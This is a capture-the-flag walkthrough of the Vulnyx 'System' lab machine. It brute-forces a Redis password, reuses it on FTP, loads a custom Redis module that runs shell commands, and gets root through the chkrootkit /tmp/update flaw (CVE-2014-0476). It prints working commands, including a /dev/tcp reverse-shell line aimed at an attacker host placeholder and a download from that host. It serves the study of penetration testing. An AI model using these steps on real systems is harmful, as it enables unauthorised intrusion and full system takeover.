# Vulnyx: System

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `redis-cli` · `hydra` · `ftp` · `gcc`/`make` · `nc` · `pspy64` |
| **Tags** | `#Redis` `#RedisModule` `#RCE` `#PasswordReuse` `#CronAbuse` `#CVE-2014-0476` |
| **URL** | https://vulnyx.com/machines/ |

Redis's own brute-force script recovers its password, and the same password turns out to be reused for FTP. With write access to a path Redis can read from, a custom-compiled Redis module is loaded directly — registering new commands that run arbitrary shell commands and spawn a reverse shell. Root comes from a real, documented `chkrootkit` vulnerability (CVE-2014-0476): a periodic root-run scan blindly executes `/tmp/update` if it exists.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn system.nyx

PORT     STATE SERVICE      REASON
2121/tcp open  ccproxy-ftp  syn-ack ttl 64
6379/tcp open  redis        syn-ack ttl 64
8000/tcp open  http-alt     syn-ack ttl 64
MAC Address: 08:00:27:E0:FA:FA (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **2121** (a non-standard FTP port), **6379 (Redis)**, and **8000**. A version/script scan against them fills in the details:

```bash
$ sudo nmap -p 2121,6379,8000 -sCV system.nyx

PORT     STATE  SERVICE VERSION
2121/tcp open   ftp     pyftpdlib 1.5.6
| ftp-syst:
|   STAT:
| FTP server status:
|    Connected to: <IP_Victim>:2121
|    Waiting for username.
|    TYPE: ASCII; STRUcture: File; MODE: Stream
|    Data connection closed.
|_End of status.
6379/tcp open   redis   Redis key-value store
MAC Address: 08:00:27:E0:FA:FA (Oracle VirtualBox virtual NIC)
```

Port 8000 returns nothing actionable on inspection, so the two services worth attacking are the FTP server on 2121 and Redis on 6379.

### Redis Enumeration & Credential Brute-Force

`nmap`'s Redis scripts probe the service and brute-force its password in one pass:

```bash
$ sudo nmap -p 6379 --script redis-info,redis-brute -sV system.nyx

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store
| redis-brute:
|   Accounts:
|     bonjour - Valid credentials
|_  Statistics: Performed 2355 guesses in 9 seconds, average tps: 261.7
|_redis-info: ERROR: Script execution failed (use -d to debug)
MAC Address: 08:00:27:E0:FA:FA (Oracle VirtualBox virtual NIC)
```

> **Redis password:** `bonjour`

Redis requires authentication (`NOAUTH` without it), and the recovered password gets in:

```bash
$ redis-cli -h system.nyx
system.nyx:6379> INFO
NOAUTH Authentication required.
```

```bash
$ redis-cli -h system.nyx -a bonjour
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
system.nyx:6379> INFO
# Server
redis_version:6.0.16
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:6d95e1af3a2c082a
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:420
run_id:b690965fa8b61649d42cc670cc318b58ffe31763
tcp_port:6379
uptime_in_seconds:198
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:8596371
executable:/usr/bin/redis-server
config_file:
io_threads_active:0
```

## Initial Access

### FTP Access via Password Reuse

A Redis password alone doesn't give a shell, but it's worth testing against other services. Since no matching username is known, it's sprayed across a list of common first names against FTP (on the non-standard port found earlier):

```bash
$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'bonjour' ftp://system.nyx -s 2121

[2121][ftp] host: system.nyx   login: ben   password: bonjour
```

> **Credentials:** `ben:bonjour`

FTP write access matters here because it gives a way to place a file on the server's filesystem — specifically, the compiled Redis module that Redis will later load:

```bash
$ ftp system.nyx 2121
Connected to system.nyx.
220 pyftpdlib 1.5.6 ready.
Name (system.nyx:kali): ben
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put module.so
local: module.so remote: module.so
229 Entering extended passive mode (|||55607|).
125 Data connection already open. Transfer starting.
100% |*******************************************************|  48232      340.72 MiB/s    00:00 ETA
226 Transfer complete.
48232 bytes sent in 00:00 (30.84 MiB/s)
```

> **Exploit:** `https://github.com/n0b0dyCN/RedisModules-ExecuteCommand`

### Weaponizing Redis with a Custom Module

Redis supports loading compiled shared-library modules at runtime (`MODULE LOAD`), and a module can register entirely new Redis commands backed by arbitrary C. If module loading isn't disabled and an attacker can get a `.so` file onto a path Redis can read, that is a direct and severe RCE vector — the loaded code runs inside the Redis server process. The public module used here registers two commands: `system.exec`, which runs a shell command via `popen()` and returns its output, and `system.rev`, which opens a raw socket back to a given host/port and executes `/bin/sh` over it:

```c
int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    // runs argv[1] via popen() and returns its output
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    // connects to argv[1]:argv[2] and execve()s /bin/sh over that socket
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    // registers "system.exec" and "system.rev" as new Redis commands
}
```

*(Full source in the original notes.)*

The module is compiled locally, and `nm` confirms the `RedisModule_OnLoad` entry point Redis looks for is present:

```bash
$ make clean && make
rm -rf *.xo *.so *.o
rm -rf ./src/*.xo ./src/*.so ./src/*.o
rm -rf ./rmutil/*.so ./rmutil/*.o ./rmutil/*.a
make -C ./src
make[1]: Entering directory '/home/kali/Vulnyx/Medium/System/RedisModules-ExecuteCommand/src'
make -C ../rmutil
make[2]: Entering directory '/home/kali/Vulnyx/Medium/System/RedisModules-ExecuteCommand/rmutil'
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../     -c -o util.o util.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../     -c -o strings.o strings.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../     -c -o sds.o sds.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../     -c -o vector.o vector.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../     -c -o alloc.o alloc.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../     -c -o periodic.o periodic.c
ar rcs librmutil.a util.o strings.o sds.o vector.o alloc.o periodic.o
make[2]: Leaving directory '/home/kali/Vulnyx/Medium/System/RedisModules-ExecuteCommand/rmutil'
gcc -I../ -Wall -g -fPIC -lc -std=gnu99     -c -o module.o module.c
ld -o module.so module.o -shared -Bsymbolic  -L../rmutil -lrmutil -lc
make[1]: Leaving directory '/home/kali/Vulnyx/Medium/System/RedisModules-ExecuteCommand/src'
cp ./src/module.so .

$ nm module.so | grep RedisModule_OnLoad
0000000000004628 T RedisModule_OnLoad
```

> ⚠️ **Note:** the notes upload `module.so` over FTP (above) and compile it (here) but don't show the compiled module being re-uploaded. The `MODULE LOAD` path used next — `/srv/ftp/module.so` — confirms that FTP's upload root (`/srv/ftp`) and the path Redis reads from are the same directory, which is exactly what makes this work: anything dropped over FTP is loadable by Redis.

### RCE via the Custom Redis Commands

Back in Redis, the uploaded module is loaded, which registers `system.exec` and `system.rev`. `system.exec "id"` confirms command execution (as the `ben`/Redis user), and `system.rev` fires a reverse shell:

```bash
$ redis-cli -h system.nyx -a bonjour
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
system.nyx:6379> MODULE LOAD /srv/ftp/module.so
OK
system.nyx:6379> system.exec "id"
"uid=1000(ben) gid=1000(ben) groups=1000(ben)\n"
system.nyx:6379> system.rev <ATTACKER_IP> <PORT>
```

### Shell as ben

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [system.nyx] 51586
id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
ben@system:/dev/shm$ ls -l /home/ben
total 4
-r--------    1 ben      ben             33 May  6  2024 user.txt
ben@system:/dev/shm$ cat /home/ben/user.txt
060bf0877030446d8166f660d542b95d
```

> **User flag:** `060bf0877030446d8166f660d542b95d`

## Privilege Escalation

### chkrootkit's `/tmp/update` Execution (CVE-2014-0476)

`pspy` watches for processes started by other users (root's cron/periodic jobs included) without needing root itself — it reads procfs continuously, catching short-lived commands a normal `ps` snapshot would miss:

```bash
$ wget http://<ATTACKER_IP>:<PORT>/pspy64
$ chmod +x pspy64
$ ./pspy64
```

<img src="../Images/system/Pasted image 20260817181924.png"/>

`pspy64` catches `chkrootkit` running periodically as root. Versions before 0.50 have a documented vulnerability (CVE-2014-0476): inside its own rootkit-detection routine, `chkrootkit` runs the command in `$SLAPPER_FILES` unquoted, which resolves to executing `/tmp/update` if that file exists and is executable — as root, with no validation of what it actually is. So dropping a malicious `/tmp/update` gets it run as root on the next scan:

```bash
ben@system:/tmp$ chkrootkit -V
chkrootkit version 0.49
```

```bash
ben@system:/tmp$ echo '#!/bin/bash' > /tmp/update
ben@system:/tmp$ echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /tmp/update
ben@system:/tmp$ chmod +x /tmp/update
ben@system:/tmp$ cat /tmp/update
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

A listener catches the callback the next time `chkrootkit` runs:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [system.nyx] 51158
bash: no se puede establecer el grupo de proceso de terminal (27372): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@system:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@system:~# ls -l /root
total 4
-r-------- 1 root root 33 may 6 2024 root.txt
root@system:~# cat /root/root.txt
3e6519259811c5b326cbff0b632a5c2d
```

> **Root flag:** `3e6519259811c5b326cbff0b632a5c2d`

## Takeaways

- Redis's `MODULE LOAD` is a full code-execution primitive by design, not a misconfiguration on its own — the real risk is any path that lets an attacker both write a `.so` file where Redis can reach it and issue the `MODULE LOAD` command (FTP writing into the same directory Redis reads, in this case).
- Password reuse across unrelated services (Redis and FTP here) is one of the most reliable pivots once any single credential leaks — worth testing immediately rather than assuming services are isolated from each other.
- Security-scanning tools that run periodically as root (`chkrootkit`, and similar) are themselves a privilege escalation surface if they're outdated — CVE-2014-0476 is over a decade old, but still shows up on boxes running an unpatched version.